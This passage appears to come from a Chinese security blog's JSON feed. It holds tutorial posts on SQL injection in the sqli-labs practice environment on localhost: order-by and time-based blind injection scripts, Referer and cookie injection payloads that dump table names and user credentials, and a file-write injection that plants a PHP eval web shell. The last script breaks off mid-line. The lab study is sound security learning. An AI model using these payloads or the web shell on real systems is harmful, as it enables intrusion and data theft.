2</span><br><span class=\"line\">id: 3 name: threezh1 </span><br><span class=\"line\">id: 1 name: 3 </span><br></pre></td></tr></table></figure>\n<p>出现差别了，因为这里是首字符不等于’7’才会出现排序不一样，所以 flag 的第一个字符为’6’。</p>\n<p>按照这个思路，写出脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">key = <span class=\"string\">&quot;&lt;tr&gt;&lt;td&gt; id: 3 &lt;/td&gt; &lt;td&gt; name: threezh1 &lt;/td&gt; &lt;br/&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt; id: 1 &lt;/td&gt; &lt;td&gt; name: 3 &lt;/td&gt; &lt;br/&gt;&lt;/tr&gt;&quot;</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/threezh1/index.php?&quot;</span></span><br><span class=\"line\">words = <span class=\"string\">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_flag</span>():</span><br><span class=\"line\">\tlength = <span class=\"number\">0</span></span><br><span class=\"line\">\tflag = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> words:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;id=3 union select 1,&#x27;&#123;0&#125;&#x27;,3 order by 2&quot;</span>.<span class=\"built_in\">format</span>(flag + j)</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">print</span>(payload)</span><br><span class=\"line\">\t\t\tcontent = requests.get(url + payload)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> key <span class=\"keyword\">in</span> content.text:</span><br><span class=\"line\">\t\t\t\tflag = flag + temp <span class=\"comment\">#使用上一次保存的字符添加到flag的尾部</span></span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">#print(flag)</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\ttemp = j <span class=\"comment\">#保存这一次的&quot;没有令回包出现变化&quot;的字符（temp保证是最新的字符）</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> j == <span class=\"string\">&#x27;Z&#x27;</span>:</span><br><span class=\"line\">\t\t\tlength = i-<span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;flag is:&quot;</span>,flag,<span class=\"string\">&quot;length is:&quot;</span>,<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\"></span><br><span class=\"line\">target_flag()</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002124705182.png\" alt=\"image-20221002124705182\"></p>\n<p>附上源码查询</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select id,F1ag,username from this_1s_th3_fiag_tab13 where id = 3 union select 1,&#x27;6&#x27;,3 order by 2</span><br></pre></td></tr></table></figure>\n<p>1-6 都是这个样子</p>\n<p><img src=\"image-20221002125810127.png\" alt=\"image-20221002125810127\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select id,F1ag,username from this_1s_th3_fiag_tab13 where id = 3 union select 1,&#x27;7&#x27;,3 order by 2</span><br></pre></td></tr></table></figure>\n<p>到 7 的时候第一次变化</p>\n<p><img src=\"image-20221002125748813.png\" alt=\"image-20221002125748813\"></p>\n<p>所以就是要记录何时第一次变化，然后把 <code>上一次没有引起回包变化的字符</code> 添加到<strong> flag 的尾部</strong></p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/",
            "url": "https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/",
            "title": "SQL注入读写文件",
            "date_published": "2022-10-01T16:29:51.000Z",
            "content_html": "<h1 id=\"sql注入之sql注入读写文件\"><a class=\"markdownIt-Anchor\" href=\"#sql注入之sql注入读写文件\">#</a> SQL 注入之 SQL 注入读写文件</h1>\n<p>本篇讲解 SQL 注入读写文件</p>\n<p>使用到的函数如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</span><br><span class=\"line\">使用条件：</span><br><span class=\"line\">A、必须有权限读取并且文件必须完全可读</span><br><span class=\"line\">B、欲读取文件必须在服务器上</span><br><span class=\"line\">C、必须指定文件完整的路径</span><br><span class=\"line\">D、欲读取文件必须小于 max_allowed_packet</span><br></pre></td></tr></table></figure>\n<p>Less-1 为例</p>\n<h2 id=\"尝试报错\"><a class=\"markdownIt-Anchor\" href=\"#尝试报错\">#</a> 尝试报错</h2>\n<p>添加一个单引号：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002005100344.png\" alt=\"image-20221002005100344\"></p>\n<h2 id=\"尝试不报错\"><a class=\"markdownIt-Anchor\" href=\"#尝试不报错\">#</a> 尝试不报错</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-1/?id=1&#x27; %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002005148813.png\" alt=\"image-20221002005148813\"></p>\n<h2 id=\"尝试order-by注入\"><a class=\"markdownIt-Anchor\" href=\"#尝试order-by注入\">#</a> 尝试 order by 注入</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-1/?id=1&#x27; order by 3 %23</span><br><span class=\"line\">不报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-1/?id=1&#x27; order by 4 %23</span><br><span class=\"line\">Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>\n<h2 id=\"读取文件\"><a class=\"markdownIt-Anchor\" href=\"#读取文件\">#</a> 读取文件</h2>\n<p>一般获取服务器的绝对路径有两种方法：</p>\n<ul>\n<li>通过经验猜测和自己搭建的服务器同样的路径</li>\n<li>通过爆破手段得到</li>\n</ul>\n<p>这里就演示一下本地服务器绝对路径</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-1/?id=-11&#x27; union select 1, 2, load_file(&quot;C:\\\\phpStudyB\\\\WWW\\\\sqli\\\\Less-1\\\\index.php&quot;) %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002005701120.png\" alt=\"image-20221002005701120\"></p>\n<p>显示比较混乱，原因是当读取到 index.php 之后返回给页面的是 php 语句，所以在页面显示的时候被 php 重复解析。</p>\n<p>我们转换 Hex 存储</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-1/?id=-11&#x27; union select 1, 2, Hex(load_file(&quot;C:\\\\phpStudyB\\\\WWW\\\\sqli\\\\Less-1\\\\index.php&quot;)) %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002005946274.png\" alt=\"image-20221002005946274\"></p>\n<p>接下来去 BurpSuit，或者在线网站转码。这里选择<strong> BurpSuit</strong>，选择 <code>Decoder-Decode as.....-Ascii hex</code></p>\n<p><img src=\"image-20221002010101190.png\" alt=\"image-20221002010101190\"></p>\n<h2 id=\"写入文件\"><a class=\"markdownIt-Anchor\" href=\"#写入文件\">#</a> 写入文件</h2>\n<p>写入文件使用函数为：into outfile</p>\n<p>例子为 Less-7</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002010552632.png\" alt=\"image-20221002010552632\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;</span><br><span class=\"line\">报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27; %23</span><br><span class=\"line\">报错，如果仅是单引号注入则这里不应该报错。所以根据经验尝试加个括号</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;) %23</span><br><span class=\"line\">报错，一个小括号不够？那就再加一个</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;)) %23</span><br><span class=\"line\">成功不报错</span><br></pre></td></tr></table></figure>\n<p>那么，使用 order by 确定列数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;)) order by 3 %23</span><br><span class=\"line\">不报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;)) order by 4 %23</span><br><span class=\"line\">You have an error in your SQL syntax，报错，所以只有三列</span><br></pre></td></tr></table></figure>\n<p>使用 <code>into outflie</code>  语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;)) union select 1,2,3 into outfile &quot;C:\\\\phpStudyB\\\\WWW\\\\sqli\\\\Less-7\\\\aaa.txt&quot; %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002011103261.png\" alt=\"image-20221002011103261\"></p>\n<p>虽然报错，但是我们尝试去看一下 <code>Less-7/aaa.txt</code>  有没有生成</p>\n<p><img src=\"image-20221002011152149.png\" alt=\"image-20221002011152149\"></p>\n<p>写入成功。那么，既然可以写入文件，那就可以写入一句话木马。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;)) union select 1,2,&quot;&lt;?php @eval ($_POST[value]);?&gt;&quot; into outfile &quot;C:\\\\phpStudyB\\\\WWW\\\\sqli\\\\Less-7\\\\aaa.php&quot; %23</span><br></pre></td></tr></table></figure>\n<p>并成功解析成 php 执行。</p>\n<p>至此，SQL 注入文件读写演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/HTTP-Referer%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/HTTP-Referer%E6%B3%A8%E5%85%A5/",
            "title": "HTTP-Referer注入",
            "date_published": "2022-10-01T15:10:40.000Z",
            "content_html": "<h1 id=\"sql注入之http-referer注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入之http-referer注入\">#</a> SQL 注入之 HTTP-Referer 注入</h1>\n<p>本篇讲解 HTTP-Referer 注入</p>\n<div class=\"note info\">\n<p>HTTP-Referer 注入</p>\n</div>\n<p>在前几章的博客中，满篇都是对于基于 select 的注入手段。</p>\n<p>其实，对于数据库而言，像 update、insert 等命令都有可爆出数据库信息的点的。</p>\n<p>OK，开始做 Less-19，送入<strong> Repeater</strong>。</p>\n<h2 id=\"尝试报错\"><a class=\"markdownIt-Anchor\" href=\"#尝试报错\">#</a> 尝试报错</h2>\n<p>在 Referer 后添加一个单引号：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27;</span><br></pre></td></tr></table></figure>\n<p>结果报错</p>\n<p><img src=\"image-20221001235013114.png\" alt=\"image-20221001235013114\"></p>\n<h2 id=\"尝试不报错\"><a class=\"markdownIt-Anchor\" href=\"#尝试不报错\">#</a> 尝试不报错</h2>\n<p>我们尝试通过加 双引号 &quot;、 #号及其变形（#、%23、–+）来看看能否不报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27;&quot;</span><br><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;&#x27;, &#x27;127.0.0.1&#x27;)&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; #</span><br><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27;&quot; %23</span><br><span class=\"line\">ou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot; %23&#x27;, &#x27;127.0.0.1&#x27;)&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; --+</span><br><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot; --+&#x27;, &#x27;127.0.0.1&#x27;)&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>后面还有个小括号，试试看是否需要闭合</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27;&quot;) --+</span><br><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;) --+&#x27;, &#x27;127.0.0.1&#x27;)&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27;)&quot; --+</span><br><span class=\"line\">ou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot; --+&#x27;, &#x27;127.0.0.1&#x27;)&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p><strong>依旧不行，我们回过头来看看第一个报错</strong></p>\n<p><code>near '&quot;', '127.0.0.1')' at line 1</code></p>\n<p><strong>去掉最外层的两个单引号：</strong></p>\n<p><code>&quot;', '127.0.0.1')</code></p>\n<p>一个数据库语句出现了逗号，说明极有可能是 union 引导的 <code>select 1,2 </code> 这样的查询，或者是<strong> insert、update</strong> 这样的语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">insert into 表名 values(a,b,c)</span><br><span class=\"line\">例子：insert into student_info values(5,&#x27;liutao&#x27;,&#x27;12&#x27;); </span><br><span class=\"line\"></span><br><span class=\"line\">UPDATE student_info SET num=4,name=&#x27;liutao&#x27;,age=&#x27;15&#x27;</span><br></pre></td></tr></table></figure>\n<p>因为除了逗号之外还出现了括号，<strong>update 和 select 一般是没有括号的</strong>，因此锁定在<strong> insert into</strong> 上。</p>\n<p>那么，我们目前注入的位置是很大概率在 <code>'liutao', '12'</code>  这个逗号所在位置附近。</p>\n<p>因此，<strong>由于注入内容后面跟着一个单引号</strong>，我们尝试 <code>and</code>  结合 <code>单引号</code> 注入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">insert into student_info values(5,&#x27;liutao&#x27; and &#x27;&#x27;,&#x27;12&#x27;); </span><br></pre></td></tr></table></figure>\n<p>OK，替换成我们的语句就是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; and &#x27;</span><br></pre></td></tr></table></figure>\n<p>成功不报错</p>\n<p><img src=\"image-20221002000657623.png\" alt=\"image-20221002000657623\"></p>\n<h2 id=\"优先尝试报错注入\"><a class=\"markdownIt-Anchor\" href=\"#优先尝试报错注入\">#</a> 优先尝试报错注入</h2>\n<p><strong>由于是使用 and + 单引号注入</strong>，可插入非法查询语句的位置和平常不太一样，因此我们尝试再加入 <code>一个and来构造一个报错条件</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; and extractvalue(1,concat(0x7e,version(),0x7e)) and &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002001021204.png\" alt=\"image-20221002001021204\"></p>\n<h2 id=\"爆数据库名\"><a class=\"markdownIt-Anchor\" href=\"#爆数据库名\">#</a> 爆数据库名</h2>\n<p>接下来就是替换 version () 了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) and &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002001434314.png\" alt=\"image-20221002001434314\"></p>\n<h2 id=\"爆表名\"><a class=\"markdownIt-Anchor\" href=\"#爆表名\">#</a> 爆表名</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002001605648.png\" alt=\"image-20221002001605648\"></p>\n<h2 id=\"爆列名\"><a class=\"markdownIt-Anchor\" href=\"#爆列名\">#</a> 爆列名</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e)) and &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002001714543.png\" alt=\"image-20221002001714543\"></p>\n<p>至此，HTTP-Referer 注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/Cookie%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/Cookie%E6%B3%A8%E5%85%A5/",
            "title": "Cookie注入",
            "date_published": "2022-10-01T14:13:13.000Z",
            "content_html": "<h1 id=\"sql注入之cookie注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入之cookie注入\">#</a> SQL 注入之 Cookie 注入</h1>\n<p>本篇讲解 Cookie 注入。</p>\n<p>老样子，Less-20，直接送入 repeater</p>\n<p><img src=\"image-20221001224019603.png\" alt=\"image-20221001224019603\"></p>\n<h2 id=\"尝试报错\"><a class=\"markdownIt-Anchor\" href=\"#尝试报错\">#</a> 尝试报错</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001224212276.png\" alt=\"image-20221001224212276\"></p>\n<h2 id=\"尝试不报错\"><a class=\"markdownIt-Anchor\" href=\"#尝试不报错\">#</a> 尝试不报错</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27; %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001224125843.png\" alt=\"image-20221001224125843\"></p>\n<h2 id=\"尝试order-by-注入\"><a class=\"markdownIt-Anchor\" href=\"#尝试order-by-注入\">#</a> 尝试 order by 注入</h2>\n<p>order by n asc/desc 是指定列号 n 进行排序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27; order by 4 %23</span><br><span class=\"line\">报错：YOUR COOKIE : uname = admin&#x27; order by 4 # and expires</span><br><span class=\"line\"></span><br><span class=\"line\">Cookie: uname=admin&#x27; order by 3 %23</span><br><span class=\"line\">成功不报错</span><br></pre></td></tr></table></figure>\n<p>因此确定 <code>列数为3</code></p>\n<p><code>注意</code> ：在 order by 后面的不会根据计算的结果来排序，所以可以直接用来报错注入。</p>\n<p>尝试下直接报错注入是否可行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27; order by extractvalue(1,concat(0x7e,version(),0x7e))%23</span><br><span class=\"line\">报错：YOUR COOKIE : uname = admin&#x27; order by extractvalue(1,concat(0x7e,version(),0x7e))#</span><br></pre></td></tr></table></figure>\n<p>报错，看来这种直接报错注入的方式是不可行的。</p>\n<h2 id=\"cookie注入查询到数据库名\"><a class=\"markdownIt-Anchor\" href=\"#cookie注入查询到数据库名\">#</a> Cookie 注入查询到数据库名</h2>\n<p>cookie 注入就是基于 union 查询的基础上，在 Cookie 中进行注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; and 0 union select 1, database(), 3 %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001225129636.png\" alt=\"image-20221001225129636\"></p>\n<h2 id=\"查询到表名\"><a class=\"markdownIt-Anchor\" href=\"#查询到表名\">#</a> 查询到表名</h2>\n<p>进而通过替换 database () 处，变成 <code>双注入</code> ，再查询出表名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; and 0 union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 3 %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001225840363.png\" alt=\"image-20221001225840363\"></p>\n<h2 id=\"查询到列名\"><a class=\"markdownIt-Anchor\" href=\"#查询到列名\">#</a> 查询到列名</h2>\n<p>一样的套路</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; and 0 union select 1, (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;), 3 %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001230122246.png\" alt=\"image-20221001230122246\"></p>\n<h2 id=\"查询到账号密码\"><a class=\"markdownIt-Anchor\" href=\"#查询到账号密码\">#</a> 查询到账号密码</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; and 0 union select 1, (select group_concat(concat_ws(0x7e,username,password)) from security.users), 3 %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001230318424.png\" alt=\"image-20221001230318424\"></p>\n<h2 id=\"思考\"><a class=\"markdownIt-Anchor\" href=\"#思考\">#</a> 思考</h2>\n<p>通过 Cookie 注入，我们要思考： <code>HTTP请求包中，是否还有其他的字段（Cookie外）也有可能和数据库产生交互呢？</code></p>\n<p>答：有的， <code>HTTP-Referer</code>  就存在。</p>\n<p>至此，Cookie 注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/",
            "url": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/",
            "title": "时间盲注",
            "date_published": "2022-10-01T12:10:06.000Z",
            "content_html": "<h1 id=\"sql注入之时间盲注\"><a class=\"markdownIt-Anchor\" href=\"#sql注入之时间盲注\">#</a> SQL 注入之时间盲注</h1>\n<p>在上一篇博客中，了解了<strong>布尔盲注</strong>，其实<strong>布尔盲注</strong>和<strong>时间盲注</strong>大致相同，注入原理是一致的，区别就是一个<strong>还是有回显的</strong>，一个<strong>彻底没有回显</strong>，通过构造语句，通过页面响应的时长，来判断信息，这就是时间盲注。</p>\n<p>先来学习一下<strong>时间盲注</strong>所需要的函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sleep()//延迟函数</span><br><span class=\"line\">if(condition,true,false)//若条件为真 返回true，若条件为假 返回false</span><br><span class=\"line\">substring(&quot;string&quot;,strart,length)</span><br></pre></td></tr></table></figure>\n<p>主要的也就是这几个了，下面就通过<strong> sqli-labs</strong> 第十关来练习时间盲注</p>\n<h2 id=\"尝试注入报错\"><a class=\"markdownIt-Anchor\" href=\"#尝试注入报错\">#</a> 尝试注入报错</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-10/?id=1&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001170904491.png\" alt=\"image-20221001170904491\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-10/?id=1&#x27;&quot;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001170453268.png\" alt=\"image-20221001170453268\"></p>\n<p>构造 <code>and 1</code>  条件，然后使用 if 条件语句包含时间盲注。</p>\n<p>如果 database () 的长度大于 5，那么返回 1，否则延迟 10s</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=1&quot; and if(length(database())&gt;5,1,sleep(10))--+</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001175533536.png\" alt=\"image-20221001175533536\"></p>\n<p>将长度改为和 10 进行比较</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-10/?id=1&quot; and if(length(database())&gt;10,1,sleep(10))--+</span><br></pre></td></tr></table></figure>\n<p>开始转圈等待 10s 了，所以存在时间盲注条件。</p>\n<p><img src=\"image-20221001184209796.png\" alt=\"image-20221001184209796\"></p>\n<p>手工注入太浪费时间，开始研究脚本爆破</p>\n<h2 id=\"尝试脚本爆破\"><a class=\"markdownIt-Anchor\" href=\"#尝试脚本爆破\">#</a> 尝试脚本爆破</h2>\n<p><strong>时间盲注只需要这两个模块，一个获取时间，一个请求网址</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import time</span><br><span class=\"line\">import requests</span><br></pre></td></tr></table></figure>\n<p><strong>全局就定义了 1 个参数，数据库可能采用的字符</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">words = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-&#123;&#125;, &quot;</span><br></pre></td></tr></table></figure>\n<p><strong>判断 database () 长度的函数，也就是数据库名的长度，可以减少判断数据库名的时间，可以修改 length () 内部的参数来判断其他变量的长度，减少跑出名字的时间</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">words = <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-&#123;&#125;, &quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_length</span>():</span><br><span class=\"line\">    length = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">15</span>):</span><br><span class=\"line\">        url = <span class=\"string\">&quot;http://127.0.0.1/sqli/Less-10/?id=1\\&quot; and if(length(database())=%d,sleep(2),0)&quot;</span> %(i)</span><br><span class=\"line\">        url = url+<span class=\"string\">&#x27;%23&#x27;</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(url)  <span class=\"comment\">#可输出测试是否写错</span></span><br><span class=\"line\">        start_time = time.time()<span class=\"comment\">#请求开始的时间</span></span><br><span class=\"line\">        requests.get(url)</span><br><span class=\"line\">        end_time = time.time()<span class=\"comment\">#请求结束的时间</span></span><br><span class=\"line\">        t = end_time - start_time<span class=\"comment\">#时间差</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> t &gt;= <span class=\"number\">1</span>:</span><br><span class=\"line\">            length = i</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;target_lenght is: &quot;</span>, length)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_name</span>():</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">10</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> words:</span><br><span class=\"line\">            <span class=\"comment\">#url = &quot;http://127.0.0.1/sqli/Less-10/?id=1\\&quot; and if(ascii(substr(select group_concat(table_name) from information_schema.tables where 